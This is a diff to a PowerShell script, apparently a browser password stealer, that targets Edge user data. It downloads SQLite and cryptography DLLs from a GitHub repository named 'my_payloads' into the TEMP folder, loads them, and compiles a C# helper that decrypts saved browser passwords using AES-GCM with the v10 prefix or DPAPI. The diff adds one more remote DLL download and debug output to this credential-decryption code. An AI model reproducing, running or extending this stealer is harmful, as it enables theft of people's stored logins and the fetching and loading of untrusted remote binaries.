@@ -5,7 +5,8 @@ $EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
 # SQLite DLL Paths
 $SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
 $SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"
-$DllPath = "$env:TEMP\System.Security.dll"
+$SystemSecurityDllPath = "$env:TEMP\System.Security.dll"
+$AlgorithmsDllPath = "$env:TEMP\System.Security.Cryptography.Algorithms.dll"
 
 # Download SQLite DLLs if missing
 if (-not (Test-Path $SQLiteDllPath)) {
@@ -14,14 +15,17 @@ if (-not (Test-Path $SQLiteDllPath)) {
 if (-not (Test-Path $SQLiteInteropPath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
 }
-if (-not (Test-Path $DllPath)) {
-    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.dll" -outfile $DllPath
+if (-not (Test-Path $SystemSecurityDllPath)) {
+    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.dll" -outfile $SystemSecurityDllPath
 }
-
+if (-not (Test-Path $AlgorithmsDllPath)) {
+    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.Cryptography.Algorithms.dll" -outfile $AlgorithmsDllPath
+}
 
 # Load SQLite Assembly
 Add-Type -Path $SQLiteDllPath -ErrorAction Stop
-Add-Type -Path $DllPath -ErrorAction Stop
+Add-Type -Path $SystemSecurityDllPath -ErrorAction Stop
+Add-Type -Path $AlgorithmsDllPath -ErrorAction Stop
 
 Add-Type -TypeDefinition @"
 using System;
@@ -34,11 +38,13 @@ public class CryptoHelper {
             if (encryptedData == null || encryptedData.Length < 3)
                 throw new Exception("Invalid encrypted data");
 
+            Console.WriteLine(string.Format("Encrypted Data Length: {0}", encryptedData.Length));
+
             if (encryptedData[0] == 118 && encryptedData[1] == 49 && encryptedData[2] == 48) {
-                // AES-GCM encrypted password (v10 prefix)
+                Console.WriteLine("Using AES-GCM Decryption");
                 return DecryptAESGCM(encryptedData, aesKey);
             } else {
-                // Old DPAPI encryption
+                Console.WriteLine("Using DPAPI Decryption");
                 return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
             }
         }
@@ -49,13 +55,20 @@ public class CryptoHelper {
 
     private static byte[] DecryptAESGCM(byte[] encryptedData, byte[] aesKey) {
         try {
-            byte[] iv = new byte[12]; // 12-byte IV
-            byte[] tag = new byte[16]; // 16-byte authentication tag
+            if (encryptedData.Length < 28)
+                throw new Exception("Invalid AES-GCM encrypted data");
+
+            byte[] iv = new byte[12]; // IV is 12 bytes
+            byte[] tag = new byte[16]; // Tag is 16 bytes
             byte[] ciphertext = new byte[encryptedData.Length - 28];
 
             Array.Copy(encryptedData, 3, iv, 0, 12);
             Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
             Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
+
+            Console.WriteLine(string.Format("IV Length: {0}", iv.Length));
+            Console.WriteLine(string.Format("Ciphertext Length: {0}", ciphertext.Length));
+            Console.WriteLine(string.Format("Tag Length: {0}", tag.Length));
 
             using (AesGcm aesGcm = new AesGcm(aesKey)) {
                 byte[] decrypted = new byte[ciphertext.Length];
@@ -63,12 +76,13 @@ public class CryptoHelper {
                 return decrypted;
             }
         }
-        catch (Exception ex){
+        catch (Exception ex) {
             return Encoding.UTF8.GetBytes("[AES-GCM decryption failed] Error: " + ex.Message);
         }
     }
 }
 "@ -Language CSharp -ReferencedAssemblies "System.Security"
+
 
 function Get-AESKey {
     param ($BrowserPath)
